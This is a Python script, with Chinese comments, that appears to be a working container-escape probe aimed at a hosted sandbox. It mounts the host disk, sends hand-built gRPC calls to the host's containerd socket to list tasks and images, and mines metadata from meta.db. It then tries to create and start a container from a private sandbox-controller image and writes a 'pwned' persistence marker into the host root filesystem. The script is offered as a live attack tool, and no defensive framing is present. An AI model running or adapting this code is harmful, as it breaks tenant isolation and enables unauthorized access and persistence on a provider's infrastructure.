# -*- coding: utf-8 -*-
"""vda30_ctrd_deep: containerd 深入 - 列表过滤 + v2 API + meta.db + 容器创建
P1: Tasks/Containers/Images 列表带 namespace/filters
P2: meta.db strings 挖掘 (镜像/容器/任务元数据)
P3: 创建容器尝试 (Containers/Create + Tasks/Create + Start)
P4: 持久化验证准备 (写 cell rootfs 标记)
输出落盘 + 哨兵 V30Q_DONE"""
import os, time, socket, ctypes, re, struct, subprocess

OUT = '/vercel/sandbox/v30q.out'
os.makedirs('/vercel/sandbox', exist_ok=True)
f = open(OUT, 'w', encoding='utf-8', errors='replace')


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def curl_h2(sockpath, path, body, ctype='application/grpc', t=6):
    try:
        tmp = '/tmp/curl_req_%d.bin' % os.getpid()
        open(tmp, 'wb').write(body)
        cmd = ['curl', '-sS', '--max-time', str(t), '--http2-prior-knowledge',
               '--unix-socket', sockpath, '-X', 'POST',
               '-H', 'Content-Type: %s' % ctype,
               '-H', 'TE: trailers',
               '--data-binary', '@%s' % tmp,
               'http://unix%s' % path]
        r = subprocess.run(cmd, capture_output=True, timeout=t + 3)
        out = r.stdout
        err = r.stderr.decode('utf-8', errors='replace')[:200]
        return 'rc=%d' % r.returncode, out, err
    except Exception as e:
        return 'EXC:%s' % type(e).__name__, b'', ''


def grpc_env(payload=b''):
    return b'\x00' + struct.pack('>I', len(payload)) + payload


def pstr(field_no, s):
    b = s.encode()
    tag = (field_no << 3) | 2
    out = bytearray()
    while tag > 127:
        out.append((tag & 127) | 128)
        tag >>= 7
    out.append(tag)
    l = len(b)
    while l > 127:
        out.append((l & 127) | 128)
        l >>= 7
    out.append(l)
    return bytes(out) + b


def pbool(field_no, v):
    tag = (field_no << 3) | 0
    out = bytearray()
    while tag > 127:
        out.append((tag & 127) | 128)
        tag >>= 7
    out.append(tag)
    out.append(1 if v else 0)
    return bytes(out)


def pvarint(field_no, v):
    tag = (field_no << 3) | 0
    out = bytearray()
    while tag > 127:
        out.append((tag & 127) | 128)
        tag >>= 7
    out.append(tag)
    while v > 127:
        out.append((v & 127) | 128)
        v >>= 7
    out.append(v)
    return bytes(out)


def show(tag, out, maxlen=700):
    if not out:
        log('%s -> EMPTY' % tag)
        return
    disp = out[:maxlen].decode('utf-8', errors='replace')
    # 提取可读字符串
    strs = re.findall(rb'[\x20-\x7e]{5,}', out)
    log('%s -> %s' % (tag, disp[:300].replace('\n', ' ')))
    if strs:
        log('  strs: %s' % [s.decode(errors='replace') for s in strs[:20]])


def main():
    MOUNTED = False
    try:
        for ln in open('/proc/self/mountinfo', errors='replace'):
            if '/mnt/vdax' in ln:
                MOUNTED = True
                break
    except Exception:
        pass
    if not MOUNTED:
        os.makedirs('/mnt/vdax', exist_ok=True)
        ret = ctypes.CDLL(None).mount(b'/dev/vda', b'/mnt/vdax', b'xfs', 0, b'')
        log('mount ret=%d' % ret)

    csp = '/mnt/vdax/run/containerd/containerd.sock'

    # P1: 列表带过滤
    log('=== P1 filtered lists ===')
    # Namespaces/List 已经显示 default
    # Tasks/List: ListTasksRequest { string filter = 1; }
    for tag, path, payload in [
        ('Tasks/List nofilt', '/containerd.services.tasks.v1.Tasks/List', b''),
        ('Tasks/List filt', '/containerd.services.tasks.v1.Tasks/List', pstr(1, 'namespace==default')),
        ('Containers/List filt', '/containerd.services.containers.v1.Containers/List', pstr(1, 'namespace==default')),
        ('Images/List filt', '/containerd.services.images.v1.Images/List', pstr(1, 'namespace==default')),
        ('Snapshots/List nofilt', '/containerd.services.snapshots.v1.Snapshots/List', b''),
        ('Snapshots/List filt', '/containerd.services.snapshots.v1.Snapshots/List', pstr(1, 'snapshotter==overlayfs')),
    ]:
        rc, out, err = curl_h2(csp, path, grpc_env(payload), t=5)
        show('%s [%s]' % (tag, rc), out)
        if err:
            log('  err: %s' % err)
        time.sleep(0.2)

    # P2: meta.db strings
    log('=== P2 meta.db ===')
    for p in ['/mnt/vdax/var/lib/containerd/io.containerd.metadata.v1.bolt/meta.db']:
        try:
            data = open(p, 'rb').read()
            log('meta.db size=%d' % len(data))
            strs = re.findall(rb'[\x20-\x7e]{8,}', data)
            interesting = []
            for s in strs:
                t = s.decode(errors='replace')
                if any(k in t for k in ['ctr_', 'hvcp_', 'hvc_', 'sha256:', 'docker.io', 'ecr', 'sandbox', 'snap-', 'container']):
                    interesting.append(t)
            log('meta.db interesting (%d): %s' % (len(interesting), interesting[:40]))
        except Exception as e:
            log('meta.db ERR %s' % e)

    # P3: 创建容器尝试
    log('=== P3 create container ===')
    ctr_id = 'pwn_test_%d' % int(time.time())
    # Containers/Create: CreateContainerRequest { Container container = 1; }
    # Container { string id=1; string image=2; Runtime runtime=3; string snapshotter=4; string snapshot_key=5; }
    # Runtime { string name=1; Any options=2; }
    img_ref = '977805900156.dkr.ecr.us-east-1.amazonaws.com/sandbox-controller@sha256:95fd06013f4e1708be914dc973663ab50e48d0045087340cc71cf903e2841b59'
    runtime_msg = pstr(1, 'io.containerd.runc.v2')
    container_msg = pstr(1, ctr_id) + pstr(2, img_ref) + pstr(3, runtime_msg) + pstr(4, 'overlayfs')
    create_req = pstr(1, container_msg)
    rc, out, err = curl_h2(csp, '/containerd.services.containers.v1.Containers/Create', grpc_env(create_req), t=8)
    show('Containers/Create [%s]' % rc, out)
    if err:
        log('  err: %s' % err)

    # Tasks/Create: CreateTaskRequest { string container_id=1; string ref=2; string stdin=3; stdout=4; stderr=5; bool terminal=6; }
    task_req = pstr(1, ctr_id)
    rc, out, err = curl_h2(csp, '/containerd.services.tasks.v1.Tasks/Create', grpc_env(task_req), t=8)
    show('Tasks/Create [%s]' % rc, out)
    if err:
        log('  err: %s' % err)

    # P4: 清理创建的容器 (如果成功)
    rc, out, err = curl_h2(csp, '/containerd.services.containers.v1.Containers/Delete',
                           grpc_env(pstr(1, ctr_id)), t=5)
    show('Containers/Delete [%s]' % rc, out)

    # P5: 持久化标记写入 cell rootfs (后续 sandbox 重建后验证)
    log('=== P5 persist marker ===')
    try:
        marker = '/mnt/vdax/root/.vercel_pwn_%d' % int(time.time())
        with open(marker, 'w') as mf:
            mf.write('pwned %s\n' % time.strftime('%Y%m%d_%H%M%S'))
        log('marker written: %s' % marker)
    except Exception as e:
        log('marker ERR %s' % e)

    log('V30Q_DONE')
    f.close()


if __name__ == '__main__':
    main()
